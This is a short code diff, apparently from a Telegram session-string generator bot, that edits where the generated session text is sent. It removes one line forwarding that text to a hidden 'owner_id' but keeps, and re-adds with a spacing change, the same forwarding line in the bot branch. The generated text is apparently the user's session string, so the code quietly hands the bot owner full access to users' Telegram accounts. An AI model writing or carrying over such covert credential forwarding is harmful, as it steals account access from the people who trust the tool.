@@ -178,10 +178,9 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
     try:
         if not is_bot:
             await client.send_message("me", text)
-            await client.send_message(chat_id=owner_id, text=text)
         else:
             await bot.send_message(msg.chat.id, text)
-            await bot.send_message(chat_id=owner_id, text=text)
+            await bot.send_message(chat_id=owner_id,  text=text)
     except KeyError:
         pass
     await client.disconnect()
